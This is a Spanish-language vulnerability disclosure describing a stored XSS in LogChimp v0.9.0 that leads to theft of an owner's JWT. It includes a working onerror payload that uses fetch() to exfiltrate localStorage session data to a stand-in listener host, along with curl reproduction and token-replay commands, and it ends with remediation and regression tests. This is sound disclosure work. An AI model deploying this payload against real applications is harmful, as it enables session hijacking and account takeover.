Stored XSS to JWT theft_

CriticalStored XSS / JWT theftResponded
Source Code ReviewStored XSSAccount TakeoverVue.jsJWT

Durante mi revisión de LogChimp v0.9.0 encontré que el contenido de los posts podía recorrer todo el flujo desde la API hasta un sink v-html sin sanitización. Una cuenta recién registrada podía guardar HTML con JavaScript en un post público y ejecutar el payload en el navegador de cualquier persona que abriera esa publicación.

El impacto aumentaba por dos decisiones de la configuración predeterminada: el token de sesión se almacenaba en localStorage y la aplicación no enviaba una Content Security Policy. En mi instancia local confirmé la cadena completa al capturar el JWT de una sesión de propietario y reutilizarlo contra endpoints autenticados y funciones reservadas.

Toda la validación se realizó en una instancia local controlada. Los dominios, credenciales, tokens e identificadores de esta publicación son sintéticos.

Superficie predeterminada

No necesité privilegios administrativos ni una configuración especial. Dos migraciones mostraban que:

  1. allowSignup estaba habilitado por defecto.
  2. El permiso post:create se asignaba al rol @everyone de los usuarios registrados.

Las rutas relevantes eran funcionalidad central de la edición comunitaria, no una característica limitada por una licencia empresarial. El flujo empezaba desde un usuario de bajo privilegio, aunque el registro público permitía llegar a ese estado sin una cuenta previa.

Del almacenamiento al sink

En el servidor, los controladores de creación y actualización guardaban contentMarkdown sin sanitizar:

packages/server/src/controllers/post/create.ts
packages/server/src/controllers/post/updatePost.ts

En el cliente, la página de detalle convertía saltos de línea en <br> y enviaba el resultado a v-html:

<p v-html="postContent" />
postContent = contentMarkdown.replace(/\n/g, "<br>");

La sustitución de saltos de línea no es un parser de Markdown ni una medida de seguridad. Un valor como <img onerror=...> conservaba su significado HTML y Vue lo insertaba en el DOM.

El sink estaba en:

packages/theme/src/pages/posts/_slug/Index.vue

La cadena principal era directa:

contentMarkdown controlado por un usuario
        ↓
almacenamiento sin sanitización
        ↓
API devuelve el valor sin cambios
        ↓
replace de saltos de línea
        ↓
v-html
        ↓
ejecución de eventos HTML

Por qué llegaba a account takeover

La store de usuario persistía authToken dentro del objeto user guardado en localStorage:

packages/theme/src/store/user.ts
localStorage["user"] → objeto de sesión con authToken

Un XSS ejecutado en el origen de la aplicación podía leer ese valor. La configuración predeterminada tampoco añadía una CSP que bloqueara manejadores inline como onerror.

El payload que utilicé en el laboratorio fue equivalente a este:

<img src=x onerror="fetch('https://listener.example.test/collect?d='+encodeURIComponent(localStorage.getItem('user')))">

Cuando el propietario abría el post, el navegador intentaba cargar x, disparaba onerror y enviaba el objeto de sesión al listener controlado. El JWT recuperado seguía siendo válido para la API, así que podía reutilizarlo hasta que expirara o fuera revocado.

Reproducción local

Definí la instancia de laboratorio:

BASE="http://localhost:8000"
API="$BASE/api/v1"

Primero creé la cuenta propietaria que usaría como víctima:

curl -s -X POST "$API/auth/setup" \
  -H "Content-Type: application/json" \
  -d '{
    "name":"Admin",
    "email":"owner@example.test",
    "password":"OwnerPass123!",
    "siteTitle":"Research Lab"
  }'

Después registré una cuenta normal e inicié sesión:

curl -s -X POST "$API/auth/signup" \
  -H "Content-Type: application/json" \
  -d '{"email":"attacker@example.test","password":"AttackerPass123!"}'

TOKEN=$(curl -s -X POST "$API/auth/login" \
  -H "Content-Type: application/json" \
  -d '{"email":"attacker@example.test","password":"AttackerPass123!"}' |
  jq -r '.user.authToken')

Con ese token creé un post público que contenía el payload:

PAYLOAD='<img src=x onerror="fetch('\''https://listener.example.test/collect?d='\''+encodeURIComponent(localStorage.getItem('\''user'\'')))">'

jq -n \
  --arg title "Feature request" \
  --arg contentMarkdown "$PAYLOAD" \
  '{title:$title,contentMarkdown:$contentMarkdown}' |
curl -s -X POST "$API/posts" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  --data-binary @-

No hacía falta engañar a la víctima para ejecutar un botón o una confirmación. La ejecución ocurría cuando abría la página pública del post como parte del uso normal del feedback board.

Evidencia de impersonación

El listener recibió el objeto serializado de la sesión del propietario, incluido su JWT. Para comprobar el impacto sin modificar información adicional, reutilicé el token contra el perfil:

curl -s "$API/users/profile" \
  -H "Authorization: Bearer <STOLEN_OWNER_TOKEN>"

La API devolvió los datos reales de la cuenta víctima. Después consulté una función reservada al propietario:

curl -i "$API/users" \
  -H "Authorization: Bearer <STOLEN_OWNER_TOKEN>"

La respuesta 200 OK confirmó que el token exfiltrado conservaba los privilegios del propietario y permitía impersonar esa sesión.

Factores que amplificaban el impacto

La vulnerabilidad primaria era el stored XSS. Estas condiciones hacían más directa la escalada:

  1. Registro público habilitado por defecto.
  2. Permiso de creación de posts para todo usuario registrado.
  3. Posts accesibles públicamente.
  4. JWT legible desde JavaScript en localStorage.
  5. Ausencia de CSP en la configuración predeterminada revisada.

El archivo packages/server/src/app.ts no configuraba una política CSP y tampoco encontré una equivalente en el frontend. Un proxy externo podría añadirla, pero no formaba parte de la instalación predeterminada que probé.

Impacto

Una cuenta normal podía persistir JavaScript en una página pública. Cualquier usuario que visitara el post ejecutaba ese código en el origen de LogChimp, incluido el propietario del sitio.

En mi prueba, esto permitió extraer y reutilizar el JWT del propietario. La sesión robada daba acceso a administración de usuarios, configuración, roles y permisos. La puntuación estimada fue 9.0 Critical con el vector AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:H.

Remediación

La corrección principal debe eliminar el HTML no confiable antes del sink:

  1. Procesar contentMarkdown con un renderer de Markdown que tenga HTML deshabilitado.
  2. Sanitizar el HTML renderizado mediante una allowlist antes de mostrarlo.
  3. Evitar v-html cuando el contenido pueda construirse con nodos o interpolación de texto.
  4. Aplicar la misma protección en creación, actualización y cualquier otra vista del post.
  5. Auditar los demás usos de v-html en packages/theme.

Como defensa en profundidad, añadiría una CSP estricta sin unsafe-inline, con al menos script-src 'self', object-src 'none' y base-uri 'self'.

También movería la sesión a una cookie httpOnly, Secure y SameSite, acompañada de protección CSRF. Eso impediría leer directamente el JWT desde JavaScript, pero no corregiría el XSS: el código inyectado todavía podría intentar realizar acciones same-origin desde el navegador de la víctima.

Pruebas de regresión

<img src=x onerror=alert(1)> en create  → no crea un handler ejecutable
payload equivalente en update           → no crea un handler ejecutable
HTML dentro de Markdown                  → se elimina o se muestra como texto
post público con contenido seguro        → conserva el formato permitido
respuestas HTTP                          → incluyen la CSP definida

Estado

Confirmé la vulnerabilidad en una instancia local sobre LogChimp v0.9.0 y el master disponible durante la revisión. El proyecto respondió al reporte y corrigió el problema.
